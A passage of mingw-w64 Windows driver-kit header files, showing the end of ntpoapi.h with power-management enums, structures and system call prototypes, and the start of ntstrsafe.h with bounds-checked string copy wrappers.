} POWER_STATE_TYPE, *PPOWER_STATE_TYPE;

typedef enum _POWER_INFORMATION_LEVEL {
    SystemPowerPolicyAc,
    SystemPowerPolicyDc,
    VerifySystemPolicyAc,
    VerifySystemPolicyDc,
    SystemPowerCapabilities,
    SystemBatteryState,
    SystemPowerStateHandler,
    ProcessorStateHandler,
    SystemPowerPolicyCurrent,
    AdministratorPowerPolicy,
    SystemReserveHiberFile,
    ProcessorInformation,
    SystemPowerInformation,
    ProcessorStateHandler2,
    LastWakeTime,
    LastSleepTime,
    SystemExecutionState,
    SystemPowerStateNotifyHandler,
    ProcessorPowerPolicyAc,
    ProcessorPowerPolicyDc,
    VerifyProcessorPowerPolicyAc,
    VerifyProcessorPowerPolicyDc,
    ProcessorPowerPolicyCurrent,
    SystemPowerStateLogging,
    SystemPowerLoggingEntry,
    SetPowerSettingValue,
    NotifyUserPowerSetting,
    PowerInformationLevelUnused0,
    PowerInformationLevelUnused1,
    SystemVideoState,
    TraceApplicationPowerMessage,
    TraceApplicationPowerMessageEnd,
    ProcessorPerfStates,
    ProcessorIdleStates,
    ProcessorCap,
    SystemWakeSource,
    SystemHiberFileInformation,
    TraceServicePowerMessage,
    ProcessorLoad,
    PowerShutdownNotification,
    MonitorCapabilities,
    SessionPowerInit,
    SessionDisplayState,
    PowerRequestCreate,
    PowerRequestAction,
    GetPowerRequestList,
    ProcessorInformationEx,
    NotifyUserModeLegacyPowerEvent,
    GroupPark,
    ProcessorIdleDomains,
    WakeTimerList,
    SystemHiberFileSize,
    PowerInformationLevelMaximum
} POWER_INFORMATION_LEVEL;

typedef enum {
    PowerActionNone,
    PowerActionReserved,
    PowerActionSleep,
    PowerActionHibernate,
    PowerActionShutdown,
    PowerActionShutdownReset,
    PowerActionShutdownOff,
    PowerActionWarmEject
} POWER_ACTION, *PPOWER_ACTION;

#if (NTDDI_VERSION >= NTDDI_WINXP) || !defined(_BATCLASS_)
typedef struct {
    ULONG Granularity;
    ULONG Capacity;
} BATTERY_REPORTING_SCALE, *PBATTERY_REPORTING_SCALE;
#endif /* (NTDDI_VERSION >= NTDDI_WINXP) || !defined(_BATCLASS_) */


#endif /* _PO_DDK_ */


#define POWER_PERF_SCALE                  100
#define PERF_LEVEL_TO_PERCENT(x)          (((x) * 1000) / (POWER_PERF_SCALE * 10))
#define PERCENT_TO_PERF_LEVEL(x)          (((x) * POWER_PERF_SCALE * 10) / 1000)

typedef struct _PROCESSOR_IDLE_TIMES {
	ULONGLONG  StartTime;
	ULONGLONG  EndTime;
	ULONG  IdleHandlerReserved[4];
} PROCESSOR_IDLE_TIMES, *PPROCESSOR_IDLE_TIMES;

typedef BOOLEAN
(FASTCALL*PPROCESSOR_IDLE_HANDLER)(
  IN OUT PPROCESSOR_IDLE_TIMES IdleTimes);

typedef struct _PROCESSOR_IDLE_HANDLER_INFO {
  ULONG  HardwareLatency;
  PPROCESSOR_IDLE_HANDLER  Handler;
} PROCESSOR_IDLE_HANDLER_INFO, *PPROCESSOR_IDLE_HANDLER_INFO;

typedef VOID
(FASTCALL*PSET_PROCESSOR_THROTTLE)(
  IN UCHAR  Throttle);

typedef NTSTATUS
(FASTCALL*PSET_PROCESSOR_THROTTLE2)(
  IN UCHAR  Throttle);

#define MAX_IDLE_HANDLERS                 3

typedef struct _PROCESSOR_STATE_HANDLER {
	UCHAR  ThrottleScale;
	BOOLEAN  ThrottleOnIdle;
	PSET_PROCESSOR_THROTTLE  SetThrottle;
	ULONG  NumIdleHandlers;
	PROCESSOR_IDLE_HANDLER_INFO  IdleHandler[MAX_IDLE_HANDLERS];
} PROCESSOR_STATE_HANDLER, *PPROCESSOR_STATE_HANDLER;

typedef enum _POWER_STATE_HANDLER_TYPE {
	PowerStateSleeping1,
	PowerStateSleeping2,
	PowerStateSleeping3,
	PowerStateSleeping4,
	PowerStateSleeping4Firmware,
	PowerStateShutdownReset,
	PowerStateShutdownOff,
	PowerStateMaximum
} POWER_STATE_HANDLER_TYPE, *PPOWER_STATE_HANDLER_TYPE;

typedef NTSTATUS
(NTAPI*PENTER_STATE_SYSTEM_HANDLER)(
  IN PVOID  SystemContext);

typedef NTSTATUS
(NTAPI*PENTER_STATE_HANDLER)(
  IN PVOID  Context,
  IN PENTER_STATE_SYSTEM_HANDLER  SystemHandler  OPTIONAL,
  IN PVOID  SystemContext,
  IN LONG  NumberProcessors,
  IN LONG volatile *Number);

typedef struct _POWER_STATE_HANDLER {
	POWER_STATE_HANDLER_TYPE  Type;
	BOOLEAN  RtcWake;
	UCHAR  Spare[3];
	PENTER_STATE_HANDLER  Handler;
	PVOID  Context;
} POWER_STATE_HANDLER, *PPOWER_STATE_HANDLER;

typedef NTSTATUS
(NTAPI*PENTER_STATE_NOTIFY_HANDLER)(
  IN POWER_STATE_HANDLER_TYPE  State,
  IN PVOID  Context,
  IN BOOLEAN  Entering);

typedef struct _POWER_STATE_NOTIFY_HANDLER {
	PENTER_STATE_NOTIFY_HANDLER  Handler;
	PVOID  Context;
} POWER_STATE_NOTIFY_HANDLER, *PPOWER_STATE_NOTIFY_HANDLER;

NTSYSCALLAPI
NTSTATUS
NTAPI
NtPowerInformation(
  IN POWER_INFORMATION_LEVEL  InformationLevel,
  IN PVOID  InputBuffer OPTIONAL,
  IN ULONG  InputBufferLength,
  OUT PVOID  OutputBuffer OPTIONAL,
  IN ULONG  OutputBufferLength);

#define PROCESSOR_STATE_TYPE_PERFORMANCE  1
#define PROCESSOR_STATE_TYPE_THROTTLE     2

typedef struct _PROCESSOR_PERF_LEVEL {
  UCHAR  PercentFrequency;
  UCHAR  Reserved;
  USHORT  Flags;
} PROCESSOR_PERF_LEVEL, *PPROCESSOR_PERF_LEVEL;

typedef struct _PROCESSOR_PERF_STATE {
  UCHAR  PercentFrequency;
  UCHAR  MinCapacity;
  USHORT  Power;
  UCHAR  IncreaseLevel;
  UCHAR  DecreaseLevel;
  USHORT  Flags;
  ULONG  IncreaseTime;
  ULONG  DecreaseTime;
  ULONG  IncreaseCount;
  ULONG  DecreaseCount;
  ULONGLONG  PerformanceTime;
} PROCESSOR_PERF_STATE, *PPROCESSOR_PERF_STATE;

typedef struct _PROCESSOR_STATE_HANDLER2 {
	ULONG  NumIdleHandlers;
	PROCESSOR_IDLE_HANDLER_INFO  IdleHandler[MAX_IDLE_HANDLERS];
	PSET_PROCESSOR_THROTTLE2  SetPerfLevel;
	ULONG  HardwareLatency;
	UCHAR  NumPerfStates;
	PROCESSOR_PERF_LEVEL  PerfLevel[1];
} PROCESSOR_STATE_HANDLER2, *PPROCESSOR_STATE_HANDLER2;

NTSYSCALLAPI
NTSTATUS
NTAPI
NtSetThreadExecutionState(
  IN EXECUTION_STATE  esFlags,
  OUT EXECUTION_STATE  *PreviousFlags);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtRequestWakeupLatency(
  IN LATENCY_TIME  latency);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtInitiatePowerAction(
  IN POWER_ACTION  SystemAction,
  IN SYSTEM_POWER_STATE  MinSystemState,
  IN ULONG  Flags,
  IN BOOLEAN  Asynchronous);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtSetSystemPowerState(
  IN POWER_ACTION SystemAction,
  IN SYSTEM_POWER_STATE MinSystemState,
  IN ULONG Flags);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtGetDevicePowerState(
  IN HANDLE  Device,
  OUT DEVICE_POWER_STATE  *State);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtCancelDeviceWakeupRequest(
  IN HANDLE  Device);

NTSYSCALLAPI
BOOLEAN
NTAPI
NtIsSystemResumeAutomatic(
  VOID);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtRequestDeviceWakeup(
  IN HANDLE  Device);

#define WINLOGON_LOCK_ON_SLEEP            0x00000001

typedef struct {
    BOOLEAN             PowerButtonPresent;
    BOOLEAN             SleepButtonPresent;
    BOOLEAN             LidPresent;
    BOOLEAN             SystemS1;
    BOOLEAN             SystemS2;
    BOOLEAN             SystemS3;
    BOOLEAN             SystemS4;
    BOOLEAN             SystemS5;
    BOOLEAN             HiberFilePresent;
    BOOLEAN             FullWake;
    BOOLEAN             VideoDimPresent;
    BOOLEAN             ApmPresent;
    BOOLEAN             UpsPresent;
    BOOLEAN             ThermalControl;
    BOOLEAN             ProcessorThrottle;
    UCHAR               ProcessorMinThrottle;
#if (NTDDI_VERSION < NTDDI_WINXP)
    UCHAR               ProcessorThrottleScale;
    UCHAR               spare2[4];
#else
    UCHAR               ProcessorMaxThrottle;
    BOOLEAN             FastSystemS4;
    UCHAR               spare2[3];
#endif /* (NTDDI_VERSION < NTDDI_WINXP) */
    BOOLEAN             DiskSpinDown;
    UCHAR               spare3[8];
    BOOLEAN             SystemBatteriesPresent;
    BOOLEAN             BatteriesAreShortTerm;
    BATTERY_REPORTING_SCALE BatteryScale[3];
    SYSTEM_POWER_STATE  AcOnLineWake;
    SYSTEM_POWER_STATE  SoftLidWake;
    SYSTEM_POWER_STATE  RtcWake;
    SYSTEM_POWER_STATE  MinDeviceWakeState;
    SYSTEM_POWER_STATE  DefaultLowLatencyWake;
} SYSTEM_POWER_CAPABILITIES, *PSYSTEM_POWER_CAPABILITIES;

typedef struct {
    BOOLEAN             AcOnLine;
    BOOLEAN             BatteryPresent;
    BOOLEAN             Charging;
    BOOLEAN             Discharging;
    BOOLEAN             Spare1[4];
    ULONG               MaxCapacity;
    ULONG               RemainingCapacity;
    ULONG               Rate;
    ULONG               EstimatedTime;
    ULONG               DefaultAlert1;
    ULONG               DefaultAlert2;
} SYSTEM_BATTERY_STATE, *PSYSTEM_BATTERY_STATE;

typedef struct _PROCESSOR_POWER_INFORMATION {
  ULONG  Number;
  ULONG  MaxMhz;
  ULONG  CurrentMhz;
  ULONG  MhzLimit;
  ULONG  MaxIdleState;
  ULONG  CurrentIdleState;
} PROCESSOR_POWER_INFORMATION, *PPROCESSOR_POWER_INFORMATION;

typedef struct _POWER_ACTION_POLICY {
    POWER_ACTION Action;
    ULONG Flags;
    ULONG EventCode;
} POWER_ACTION_POLICY, *PPOWER_ACTION_POLICY;

/* POWER_ACTION_POLICY.Flags constants */
#define POWER_ACTION_QUERY_ALLOWED        0x00000001
#define POWER_ACTION_UI_ALLOWED           0x00000002
#define POWER_ACTION_OVERRIDE_APPS        0x00000004
#define POWER_ACTION_LIGHTEST_FIRST       0x10000000
#define POWER_ACTION_LOCK_CONSOLE         0x20000000
#define POWER_ACTION_DISABLE_WAKES        0x40000000
#define POWER_ACTION_CRITICAL             0x80000000

/* POWER_ACTION_POLICY.EventCode constants */
#define POWER_LEVEL_USER_NOTIFY_TEXT      0x00000001
#define POWER_LEVEL_USER_NOTIFY_SOUND     0x00000002
#define POWER_LEVEL_USER_NOTIFY_EXEC      0x00000004
#define POWER_USER_NOTIFY_BUTTON          0x00000008
#define POWER_USER_NOTIFY_SHUTDOWN        0x00000010
#define POWER_FORCE_TRIGGER_RESET         0x80000000

#define DISCHARGE_POLICY_CRITICAL	0
#define DISCHARGE_POLICY_LOW		1
#define NUM_DISCHARGE_POLICIES		4

#define PO_THROTTLE_NONE	0
#define PO_THROTTLE_CONSTANT	1
#define PO_THROTTLE_DEGRADE	2
#define PO_THROTTLE_ADAPTIVE	3
#define PO_THROTTLE_MAXIMUM	4

#ifdef __cplusplus
}
#endif

#endif /* __NTPOAPI_H */


```

`include/ddk/ntstrsafe.h`:

```h
/**
 * This file has no copyright assigned and is placed in the Public Domain.
 * This file is part of the mingw-w64 runtime package.
 * No warranty is given; refer to the file DISCLAIMER.PD within this package.
 */
#ifndef _NTSTRSAFE_H_INCLUDED_
#define _NTSTRSAFE_H_INCLUDED_

#include <_mingw_unicode.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <specstrings.h>

#if defined(__CRT__NO_INLINE) && !defined(__CRT_STRSAFE_IMPL)
#define __STRSAFE__NO_INLINE
#endif

#ifndef _SIZE_T_DEFINED
#define _SIZE_T_DEFINED
#undef size_t
#ifdef _WIN64
__MINGW_EXTENSION typedef unsigned __int64 size_t;
#else
typedef unsigned int size_t;
#endif
#endif

#ifndef _WCHAR_T_DEFINED
#define _WCHAR_T_DEFINED
typedef unsigned short wchar_t;
#endif

#ifndef _NTSTATUS_DEFINED
#define _NTSTATUS_DEFINED
typedef __LONG32 NTSTATUS;
#endif

#ifndef C_ASSERT
#ifdef _MSC_VER
# define C_ASSERT(e) typedef char __C_ASSERT__[(e)?1:-1]
#else
# define C_ASSERT(e) extern void __C_ASSERT__(int [(e)?1:-1])
#endif
#endif /* C_ASSERT */

/* extern removed for C mode to avoid double extern qualifier from __CRT_INLINE */
#ifdef __cplusplus
#define _STRSAFE_EXTERN_C extern "C"
#else
#define _STRSAFE_EXTERN_C extern
#endif

#ifndef WINAPI
#if defined(_ARM_)
#define WINAPI
#else
#define WINAPI __stdcall
#endif
#endif

#if !defined(__CRT__NO_INLINE) && !defined(__CRT_STRSAFE_IMPL)
#define NTSTRSAFEDDI _STRSAFE_EXTERN_C __inline NTSTATUS WINAPI
/* Variadic functions can't be __stdcall.  */
#define NTSTRSAFEDDIV _STRSAFE_EXTERN_C __inline NTSTATUS
#else
#define NTSTRSAFEDDI _STRSAFE_EXTERN_C NTSTATUS WINAPI
/* Variadic functions can't be __stdcall.  */
#define NTSTRSAFEDDIV _STRSAFE_EXTERN_C NTSTATUS
#endif

#define NTSTRSAFE_MAX_CCH 2147483647

#define STRSAFE_IGNORE_NULLS 0x00000100
#define STRSAFE_FILL_BEHIND_NULL 0x00000200
#define STRSAFE_FILL_ON_FAILURE 0x00000400
#define STRSAFE_NULL_ON_FAILURE 0x00000800
#define STRSAFE_NO_TRUNCATION 0x00001000
#define STRSAFE_IGNORE_NULL_UNICODE_STRINGS 0x00010000
#define STRSAFE_UNICODE_STRING_DEST_NULL_TERMINATED 0x00020000

#define STRSAFE_VALID_FLAGS (0x000000FF | STRSAFE_IGNORE_NULLS | STRSAFE_FILL_BEHIND_NULL | STRSAFE_FILL_ON_FAILURE | STRSAFE_NULL_ON_FAILURE | STRSAFE_NO_TRUNCATION)
#define STRSAFE_UNICODE_STRING_VALID_FLAGS (STRSAFE_VALID_FLAGS | STRSAFE_IGNORE_NULL_UNICODE_STRINGS | STRSAFE_UNICODE_STRING_DEST_NULL_TERMINATED)

#define STRSAFE_FILL_BYTE(x) ((unsigned __LONG32)((x & 0x000000FF) | STRSAFE_FILL_BEHIND_NULL))
#define STRSAFE_FAILURE_BYTE(x) ((unsigned __LONG32)((x & 0x000000FF) | STRSAFE_FILL_ON_FAILURE))

#define STRSAFE_GET_FILL_PATTERN(dwFlags) ((int)(dwFlags & 0x000000FF))

typedef char *NTSTRSAFE_PSTR;
typedef const char *NTSTRSAFE_PCSTR;
typedef wchar_t *NTSTRSAFE_PWSTR;
typedef const wchar_t *NTSTRSAFE_PCWSTR;

NTSTRSAFEDDI RtlStringCopyWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc);
NTSTRSAFEDDI RtlStringCopyWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc);
NTSTRSAFEDDI RtlStringCopyExWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags);
NTSTRSAFEDDI RtlStringCopyExWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags);
NTSTRSAFEDDI RtlStringCopyNWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc,size_t cchToCopy);
NTSTRSAFEDDI RtlStringCopyNWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc,size_t cchToCopy);
NTSTRSAFEDDI RtlStringCopyNExWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,size_t cchToCopy,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags);
NTSTRSAFEDDI RtlStringCopyNExWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,size_t cchToCopy,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags);
NTSTRSAFEDDI RtlStringCatWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc);
NTSTRSAFEDDI RtlStringCatWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc);
NTSTRSAFEDDI RtlStringCatExWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags);
NTSTRSAFEDDI RtlStringCatExWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags);
NTSTRSAFEDDI RtlStringCatNWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc,size_t cchToAppend);
NTSTRSAFEDDI RtlStringCatNWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc,size_t cchToAppend);
NTSTRSAFEDDI RtlStringCatNExWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,size_t cchToAppend,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags);
NTSTRSAFEDDI RtlStringCatNExWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,size_t cchToAppend,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags);
NTSTRSAFEDDI RtlStringVPrintfWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszFormat,va_list argList);
NTSTRSAFEDDI RtlStringVPrintfWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszFormat,va_list argList);
NTSTRSAFEDDI RtlStringVPrintfExWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCSTR pszFormat,va_list argList);
NTSTRSAFEDDI RtlStringVPrintfExWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCWSTR pszFormat,va_list argList);
NTSTRSAFEDDI RtlStringLengthWorkerA(NTSTRSAFE_PCSTR psz,size_t cchMax,size_t *pcchLength);
NTSTRSAFEDDI RtlStringLengthWorkerW(NTSTRSAFE_PCWSTR psz,size_t cchMax,size_t *pcchLength);

#define RtlStringCchCopy __MINGW_NAME_AW(RtlStringCchCopy)

NTSTRSAFEDDI RtlStringCchCopyA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc);
NTSTRSAFEDDI RtlStringCchCopyW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc);

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCchCopyA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc) {
  return (cchDest > NTSTRSAFE_MAX_CCH ? STATUS_INVALID_PARAMETER : RtlStringCopyWorkerA(pszDest,cchDest,pszSrc));
}

NTSTRSAFEDDI RtlStringCchCopyW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc) {
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringCopyWorkerW(pszDest,cchDest,pszSrc);
}
#endif /* !__STRSAFE__NO_INLINE */

#define RtlStringCbCopy __MINGW_NAME_AW(RtlStringCbCopy)

NTSTRSAFEDDI RtlStringCbCopyA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc);
NTSTRSAFEDDI RtlStringCbCopyW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc);

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCbCopyA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc) {
  if(cbDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringCopyWorkerA(pszDest,cbDest,pszSrc);
}

NTSTRSAFEDDI RtlStringCbCopyW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc) {
  size_t cchDest = cbDest / sizeof(wchar_t);
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringCopyWorkerW(pszDest,cchDest,pszSrc);
}
#endif /* !__STRSAFE__NO_INLINE */

#define RtlStringCchCopyEx __MINGW_NAME_AW(RtlStringCchCopyEx)

NTSTRSAFEDDI RtlStringCchCopyExA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags);
NTSTRSAFEDDI RtlStringCchCopyExW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags);

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCchCopyExA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags) {
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringCopyExWorkerA(pszDest,cchDest,cchDest,pszSrc,ppszDestEnd,pcchRemaining,dwFlags);
}

NTSTRSAFEDDI RtlStringCchCopyExW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags) {
  size_t cbDest;
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  cbDest = cchDest * sizeof(wchar_t);
  return RtlStringCopyExWorkerW(pszDest,cchDest,cbDest,pszSrc,ppszDestEnd,pcchRemaining,dwFlags);
}
#endif /* !__STRSAFE__NO_INLINE */

#define RtlStringCbCopyEx __MINGW_NAME_AW(RtlStringCbCopyEx)

NTSTRSAFEDDI RtlStringCbCopyExA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags);
NTSTRSAFEDDI RtlStringCbCopyExW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags);

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCbCopyExA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags) {
  NTSTATUS hr;
  size_t cchRemaining = 0;
  if(cbDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  hr = RtlStringCopyExWorkerA(pszDest,cbDest,cbDest,pszSrc,ppszDestEnd,&cchRemaining,dwFlags);
  if(NT_SUCCESS(hr) || hr == STATUS_BUFFER_OVERFLOW) {
    if(pcbRemaining)
      *pcbRemaining = (cchRemaining*sizeof(char)) + (cbDest % sizeof(char));
  }
  return hr;
}

NTSTRSAFEDDI RtlStringCbCopyExW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags) {
  NTSTATUS hr;
  size_t cchDest = cbDest / sizeof(wchar_t);
  size_t cchRemaining = 0;

  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  hr = RtlStringCopyExWorkerW(pszDest,cchDest,cbDest,pszSrc,ppszDestEnd,&cchRemaining,dwFlags);
  if(NT_SUCCESS(hr) || (hr==STATUS_BUFFER_OVERFLOW)) {
    if(pcbRemaining)
      *pcbRemaining = (cchRemaining*sizeof(wchar_t)) + (cbDest % sizeof(wchar_t));
  }
  return hr;
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDI RtlStringCchCopyNA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc,size_t cchToCopy);
NTSTRSAFEDDI RtlStringCchCopyNW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc,size_t cchToCopy);
#define RtlStringCchCopyN __MINGW_NAME_AW(RtlStringCchCopyN)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCchCopyNA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc,size_t cchToCopy) {
  if(cchDest > NTSTRSAFE_MAX_CCH || cchToCopy > NTSTRSAFE_MAX_CCH)
    return STATUS_INVALID_PARAMETER;
  return RtlStringCopyNWorkerA(pszDest,cchDest,pszSrc,cchToCopy);
}

NTSTRSAFEDDI RtlStringCchCopyNW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc,size_t cchToCopy) {
  if(cchDest > NTSTRSAFE_MAX_CCH || cchToCopy > NTSTRSAFE_MAX_CCH)
    return STATUS_INVALID_PARAMETER;
  return RtlStringCopyNWorkerW(pszDest,cchDest,pszSrc,cchToCopy);
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDI RtlStringCbCopyNA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,size_t cbToCopy);
NTSTRSAFEDDI RtlStringCbCopyNW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,size_t cbToCopy);

#define RtlStringCbCopyN __MINGW_NAME_AW(RtlStringCbCopyN)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCbCopyNA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,size_t cbToCopy) {
  if(cbDest > NTSTRSAFE_MAX_CCH || cbToCopy > NTSTRSAFE_MAX_CCH)
    return STATUS_INVALID_PARAMETER;
  return RtlStringCopyNWorkerA(pszDest,cbDest,pszSrc,cbToCopy);
}

NTSTRSAFEDDI RtlStringCbCopyNW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,size_t cbToCopy) {
  size_t cchDest  = cbDest / sizeof(wchar_t);
  size_t cchToCopy = cbToCopy / sizeof(wchar_t);
  if(cchDest > NTSTRSAFE_MAX_CCH || cchToCopy > NTSTRSAFE_MAX_CCH)
    return STATUS_INVALID_PARAMETER;
  return RtlStringCopyNWorkerW(pszDest,cchDest,pszSrc,cchToCopy);
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDI RtlStringCchCopyNExA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc,size_t cchToCopy,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags);
NTSTRSAFEDDI RtlStringCchCopyNExW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc,size_t cchToCopy,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags);

#define RtlStringCchCopyNEx __MINGW_NAME_AW(RtlStringCchCopyNEx)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCchCopyNExA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc,size_t cchToCopy,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags) {
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringCopyNExWorkerA(pszDest,cchDest,cchDest,pszSrc,cchToCopy,ppszDestEnd,pcchRemaining,dwFlags);
}

